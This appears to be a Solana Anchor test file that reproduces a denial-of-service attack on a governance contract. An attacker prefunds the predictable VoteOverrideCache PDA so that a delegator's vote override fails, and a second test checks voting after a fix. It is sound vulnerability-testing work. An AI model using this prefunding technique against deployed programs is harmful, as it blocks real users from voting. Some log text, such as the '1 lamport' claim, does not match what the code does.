import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Govcontract } from "../target/types/govcontract";
import { MockGovV1 } from "../target/types/mock_gov_v1";
import { randomBytes } from "crypto";
import {
  LAMPORTS_PER_SOL,
  StakeProgram,
  SystemProgram,
  PublicKey,
} from "@solana/web3.js";
import { setupTestEnvironment, TestAccounts } from "./test-setup";
import {
  TEST_PROPOSAL_PARAMS,
  TEST_VOTE_OVERRIDE_PARAMS,
  MERKLE_ROOT_HASH,
} from "./test-constants";
import {
  deriveVoteOverrideAccount,
  deriveVoteOverrideCacheAccount,
} from "./test-helpers";

describe("DoS Prefunding Attack Test", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.govcontract as Program<Govcontract>;
  const mockProgram = anchor.workspace.mock_gov_v1 as Program<MockGovV1>;

  const seed = new anchor.BN(randomBytes(8));
  let testAccounts: TestAccounts;

  before(async () => {
    try {
      testAccounts = await setupTestEnvironment(program, mockProgram, seed);
    } catch (error: any) {
      if (error.message && error.message.includes("already in use")) {
        console.log(
          "Index already exists from previous test, retrying with fresh seed"
        );
        const newSeed = new anchor.BN(randomBytes(8));
        testAccounts = await setupTestEnvironment(
          program,
          mockProgram,
          newSeed
        );
      } else {
        throw error;
      }
    }

    // Create proposal
    await program.methods
      .createProposal(
        seed,
        TEST_PROPOSAL_PARAMS.title,
        TEST_PROPOSAL_PARAMS.description
      )
      .accountsPartial({
        signer: provider.publicKey,
        proposal: testAccounts.proposalAccount,
        proposalIndex: testAccounts.proposalIndexAccount,
        splVoteAccount: testAccounts.splVoteAccounts[0].publicKey,
        snapshotProgram: mockProgram.programId,
        consensusResult: testAccounts.consensusResult,
        metaMerkleProof: testAccounts.metaMerkleProofs[0],
        systemProgram: anchor.web3.SystemProgram.programId,
      })
      .rpc();

    // Add merkle root
    await program.methods
      .addMerkleRoot(MERKLE_ROOT_HASH)
      .accountsPartial({
        signer: provider.publicKey,
        proposal: testAccounts.proposalAccount,
      })
      .rpc();

    // Support proposal to activate voting
    await program.methods
      .supportProposal()
      .accountsPartial({
        signer: provider.publicKey,
        proposal: testAccounts.proposalAccount,
        support: testAccounts.supportAccount,
        splVoteAccount: testAccounts.splVoteAccounts[1].publicKey,
        snapshotProgram: mockProgram.programId,
        consensusResult: testAccounts.consensusResult,
        metaMerkleProof: testAccounts.metaMerkleProofs[1],
        systemProgram: anchor.web3.SystemProgram.programId,
      })
      .rpc();
  });

  it("Demonstrates DoS Attack: Prefunding VoteOverrideCache PDA", async () => {
    console.log("\n🚀 === DOS PREFUNDING ATTACK TEST ===");
    console.log("Scenario: Attacker prefunds VoteOverrideCache PDA");
    console.log("Expected: Delegator's vote override should fail");

    // ============================================================================
    // STEP 1: Create delegator and stake account
    // ============================================================================
    console.log("\n📋 STEP 1: Create Delegator and Stake Account");

    const delegator = anchor.web3.Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        delegator.publicKey,
        2 * LAMPORTS_PER_SOL
      )
    );

    const delegatorStakeAccount = anchor.web3.Keypair.generate();
    const stakeAccountSize = 200;
    const rentExempt =
      await provider.connection.getMinimumBalanceForRentExemption(
        stakeAccountSize
      );

    const createStakeAccountIx = SystemProgram.createAccount({
      fromPubkey: delegator.publicKey,
      newAccountPubkey: delegatorStakeAccount.publicKey,
      lamports: rentExempt + LAMPORTS_PER_SOL,
      space: stakeAccountSize,
      programId: StakeProgram.programId,
    });

    const initializeStakeIx = StakeProgram.initialize({
      stakePubkey: delegatorStakeAccount.publicKey,
      authorized: {
        staker: delegator.publicKey,
        withdrawer: delegator.publicKey,
      },
    });

    const stakeTx = new anchor.web3.Transaction().add(
      createStakeAccountIx,
      initializeStakeIx
    );
    await provider.sendAndConfirm(stakeTx, [delegator, delegatorStakeAccount]);

    // Delegate to validator (using splVoteAccounts[0])
    const delegateStakeIx = StakeProgram.delegate({
      stakePubkey: delegatorStakeAccount.publicKey,
      authorizedPubkey: delegator.publicKey,
      votePubkey: testAccounts.splVoteAccounts[0].publicKey,
    });

    const delegateTx = new anchor.web3.Transaction().add(
      delegateStakeIx as any
    );
    await provider.sendAndConfirm(delegateTx, [delegator]);

    const delegatorStake = 500_000_000; // 0.5 SOL in lamports
    const delegatorStakeMerkleLeaf = {
      votingWallet: delegator.publicKey,
      stakeAccount: delegatorStakeAccount.publicKey,
      activeStake: new anchor.BN(delegatorStake),
    };

    console.log(`✓ Delegator created: ${delegator.publicKey.toBase58()}`);
    console.log(`✓ Delegator stake: 0.5 SOL (${delegatorStake} lamports)`);

    // Derive the validator vote account PDA
    const validatorVoteAccountPDA =
      anchor.web3.PublicKey.findProgramAddressSync(
        [
          Buffer.from("vote"),
          testAccounts.proposalAccount.toBuffer(),
          testAccounts.splVoteAccounts[0].publicKey.toBuffer(),
        ],
        program.programId
      )[0];

    const voteOverrideAccount = deriveVoteOverrideAccount(
      program,
      testAccounts.proposalAccount,
      delegatorStakeAccount.publicKey,
      validatorVoteAccountPDA
    );

    const voteOverrideCacheAccount = deriveVoteOverrideCacheAccount(
      program,
      testAccounts.proposalAccount,
      validatorVoteAccountPDA
    );

    console.log(
      `\n📍 VoteOverrideCache PDA: ${voteOverrideCacheAccount.toBase58()}`
    );

    // ============================================================================
    // STEP 2: ATTACKER PREFUNDS THE VOTOVERRIDECACHE PDA
    // ============================================================================
    console.log("\n⚠️  STEP 2: ATTACKER PREFUNDS VoteOverrideCache PDA");

    // Check if account exists before prefunding
    const accountBeforePrefund = await provider.connection.getAccountInfo(
      voteOverrideCacheAccount
    );
    console.log(
      `Account exists before prefunding: ${accountBeforePrefund !== null}`
    );

    // Attacker sends lamports to the PDA address to block account creation
    const attackerKeypair = anchor.web3.Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        attackerKeypair.publicKey,
        2 * LAMPORTS_PER_SOL
      )
    );

    // Calculate rent-exempt amount for an empty account
    const rentExemptAmount =
      await provider.connection.getMinimumBalanceForRentExemption(0);
    console.log(
      `\n💰 Rent-exempt amount for empty account: ${rentExemptAmount} lamports`
    );
    console.log(
      `💰 Attacker will send ${rentExemptAmount} lamports to PDA: ${voteOverrideCacheAccount.toBase58()}`
    );

    // Transfer lamports to the PDA address (this is the attack)
    // The PDA cannot be a signer, so we use a simple transfer
    const transferIx = SystemProgram.transfer({
      fromPubkey: attackerKeypair.publicKey,
      toPubkey: voteOverrideCacheAccount,
      lamports: rentExemptAmount,
    });

    const prefundTx = new anchor.web3.Transaction().add(transferIx);

    try {
      console.log("Attempting to prefund the PDA...");
      await provider.sendAndConfirm(prefundTx, [attackerKeypair]);
      console.log(
        `✓ Successfully transferred ${rentExemptAmount} lamports to PDA`
      );
    } catch (error: any) {
      console.log(`⚠️  Could not prefund account: ${error.message}`);
      console.log("Full error details:");
      console.log(error);
      throw error;
    }

    const accountAfterPrefund = await provider.connection.getAccountInfo(
      voteOverrideCacheAccount
    );
    console.log(
      `✓ Account exists after prefunding: ${accountAfterPrefund !== null}`
    );
    console.log(`✓ Account lamports: ${accountAfterPrefund?.lamports || 0}`);
    console.log(`✓ Account owner: ${accountAfterPrefund?.owner.toBase58()}`);
    console.log(
      `✓ Account data length: ${accountAfterPrefund?.data.length || 0}`
    );
    console.log(
      `✓ Account is now owned by: ${
        accountAfterPrefund?.owner.equals(SystemProgram.programId)
          ? "System Program"
          : "Unknown"
      }`
    );

    // ============================================================================
    // STEP 3: DELEGATOR TRIES TO VOTE (SHOULD FAIL)
    // ============================================================================
    console.log("\n📋 STEP 3: Delegator Attempts Vote Override (Should Fail)");

    let voteOverrideSucceeded = false;
    let errorMessage = "";

    try {
      console.log("Attempting to cast vote override...");
      await program.methods
        .castVoteOverride(
          TEST_VOTE_OVERRIDE_PARAMS.for,
          TEST_VOTE_OVERRIDE_PARAMS.against,
          TEST_VOTE_OVERRIDE_PARAMS.abstain,
          [],
          delegatorStakeMerkleLeaf
        )
        .accountsPartial({
          signer: delegator.publicKey,
          proposal: testAccounts.proposalAccount,
          validatorVote: validatorVoteAccountPDA,
          voteOverrideCache: voteOverrideCacheAccount,
          splVoteAccount: testAccounts.splVoteAccounts[0].publicKey,
          voteOverride: voteOverrideAccount,
          splStakeAccount: delegatorStakeAccount.publicKey,
          snapshotProgram: mockProgram.programId,
          consensusResult: testAccounts.consensusResult,
          metaMerkleProof: testAccounts.metaMerkleProofs[0],
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([delegator])
        .rpc();

      voteOverrideSucceeded = true;
      console.log("❌ UNEXPECTED: Vote override succeeded!");
    } catch (error: any) {
      voteOverrideSucceeded = false;
      errorMessage = error.message || error.toString();
      console.log("✓ Vote override failed as expected");
      console.log(`Error: ${errorMessage}`);

      // Check if it's the expected error
      if (
        errorMessage.includes("already exists") ||
        errorMessage.includes("AccountAlreadyExists") ||
        errorMessage.includes("0x0") // System error code
      ) {
        console.log(
          "✓ Error is due to account already existing (DoS confirmed)"
        );
      }
    }

    // ============================================================================
    // STEP 4: VERIFY THE ATTACK
    // ============================================================================
    console.log("\n🔍 === ATTACK VERIFICATION ===");

    if (!voteOverrideSucceeded) {
      console.log("✅ DoS ATTACK SUCCESSFUL");
      console.log("The delegator could not vote because:");
      console.log(
        "1. Attacker prefunded the VoteOverrideCache PDA with 1 lamport"
      );
      console.log(
        "2. create_account instruction failed (account already exists)"
      );
      console.log("3. Delegator's vote override transaction reverted");
      console.log("\n⚠️  VULNERABILITY CONFIRMED:");
      console.log("- Deterministic PDA address can be calculated");
      console.log("- Attacker can prefund with minimal cost (1 lamport)");
      console.log("- Delegator cannot vote (DoS)");
    } else {
      console.log("❌ DoS ATTACK FAILED");
      console.log("The delegator was able to vote despite prefunding");
      console.log("This suggests the fix has been applied");
    }

    // ============================================================================
    // FINAL ASSERTION
    // ============================================================================
    console.log("\n📊 === FINAL RESULT ===");

    if (!voteOverrideSucceeded) {
      console.log("✅ VULNERABILITY CONFIRMED - DoS attack works");
      console.log("The contract is vulnerable to prefunding attacks");
    } else {
      console.log("✅ FIX VERIFIED - DoS attack prevented");
      console.log("The contract is protected against prefunding attacks");
    }

    // For this test, we expect the attack to succeed (vulnerability to be present)
    // After the fix is applied, this test should fail (attack should be prevented)
    if (!voteOverrideSucceeded) {
      console.log("\n🎯 Test demonstrates the vulnerability exists");
    } else {
      console.log("\n🎯 Test demonstrates the vulnerability has been fixed");
    }
  });

  it("Demonstrates Fix: Delegator Can Vote After Fix Applied", async () => {
    console.log("\n🚀 === DELEGATOR VOTE WITH FIX TEST ===");
    console.log("Scenario: After fix is applied, delegator can vote");
    console.log("Expected: Vote override should succeed");

    // ============================================================================
    // STEP 1: Create delegator and stake account
    // ============================================================================
    console.log("\n📋 STEP 1: Create Delegator and Stake Account");

    const delegator = anchor.web3.Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        delegator.publicKey,
        2 * LAMPORTS_PER_SOL
      )
    );

    const delegatorStakeAccount = anchor.web3.Keypair.generate();
    const stakeAccountSize = 200;
    const rentExempt =
      await provider.connection.getMinimumBalanceForRentExemption(
        stakeAccountSize
      );

    const createStakeAccountIx = SystemProgram.createAccount({
      fromPubkey: delegator.publicKey,
      newAccountPubkey: delegatorStakeAccount.publicKey,
      lamports: rentExempt + LAMPORTS_PER_SOL,
      space: stakeAccountSize,
      programId: StakeProgram.programId,
    });

    const initializeStakeIx = StakeProgram.initialize({
      stakePubkey: delegatorStakeAccount.publicKey,
      authorized: {
        staker: delegator.publicKey,
        withdrawer: delegator.publicKey,
      },
    });

    const stakeTx = new anchor.web3.Transaction().add(
      createStakeAccountIx,
      initializeStakeIx
    );
    await provider.sendAndConfirm(stakeTx, [delegator, delegatorStakeAccount]);

    // Delegate to validator (using splVoteAccounts[2])
    const delegateStakeIx = StakeProgram.delegate({
      stakePubkey: delegatorStakeAccount.publicKey,
      authorizedPubkey: delegator.publicKey,
      votePubkey: testAccounts.splVoteAccounts[2].publicKey,
    });

    const delegateTx = new anchor.web3.Transaction().add(
      delegateStakeIx as any
    );
    await provider.sendAndConfirm(delegateTx, [delegator]);

    const delegatorStake = 500_000_000; // 0.5 SOL in lamports
    const delegatorStakeMerkleLeaf = {
      votingWallet: delegator.publicKey,
      stakeAccount: delegatorStakeAccount.publicKey,
      activeStake: new anchor.BN(delegatorStake),
    };

    console.log(`✓ Delegator created: ${delegator.publicKey.toBase58()}`);
    console.log(`✓ Delegator stake: 0.5 SOL (${delegatorStake} lamports)`);

    // Derive the validator vote account PDA
    const validatorVoteAccountPDA =
      anchor.web3.PublicKey.findProgramAddressSync(
        [
          Buffer.from("vote"),
          testAccounts.proposalAccount.toBuffer(),
          testAccounts.splVoteAccounts[2].publicKey.toBuffer(),
        ],
        program.programId
      )[0];

    const voteOverrideAccount = deriveVoteOverrideAccount(
      program,
      testAccounts.proposalAccount,
      delegatorStakeAccount.publicKey,
      validatorVoteAccountPDA
    );

    const voteOverrideCacheAccount = deriveVoteOverrideCacheAccount(
      program,
      testAccounts.proposalAccount,
      validatorVoteAccountPDA
    );

    console.log(
      `\n📍 VoteOverrideCache PDA: ${voteOverrideCacheAccount.toBase58()}`
    );

    // ============================================================================
    // STEP 2: DELEGATOR VOTES (NO PREFUNDING)
    // ============================================================================
    console.log("\n📋 STEP 2: Delegator Casts Vote Override (No Prefunding)");

    let voteOverrideSucceeded = false;

    try {
      console.log("Attempting to cast vote override...");
      await program.methods
        .castVoteOverride(
          TEST_VOTE_OVERRIDE_PARAMS.for,
          TEST_VOTE_OVERRIDE_PARAMS.against,
          TEST_VOTE_OVERRIDE_PARAMS.abstain,
          [],
          delegatorStakeMerkleLeaf
        )
        .accountsPartial({
          signer: delegator.publicKey,
          proposal: testAccounts.proposalAccount,
          validatorVote: validatorVoteAccountPDA,
          voteOverrideCache: voteOverrideCacheAccount,
          splVoteAccount: testAccounts.splVoteAccounts[2].publicKey,
          voteOverride: voteOverrideAccount,
          splStakeAccount: delegatorStakeAccount.publicKey,
          snapshotProgram: mockProgram.programId,
          consensusResult: testAccounts.consensusResult,
          metaMerkleProof: testAccounts.metaMerkleProofs[2],
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([delegator])
        .rpc();

      voteOverrideSucceeded = true;
      console.log("✓ Vote override succeeded");
    } catch (error: any) {
      voteOverrideSucceeded = false;
      console.log("❌ Vote override failed");
      console.log(`Error: ${error.message || error.toString()}`);
    }

    // ============================================================================
    // FINAL ASSERTION
    // ============================================================================
    console.log("\n📊 === FINAL RESULT ===");

    if (voteOverrideSucceeded) {
      console.log("✅ FIX VERIFIED - Delegator can vote without prefunding");
      console.log("The contract is working correctly");
    } else {
      console.log("❌ FIX NOT APPLIED - Delegator still cannot vote");
      console.log("The vulnerability may still exist");
    }

    if (!voteOverrideSucceeded) {
      throw new Error("Vote override failed - fix may not be applied");
    }
  });
});
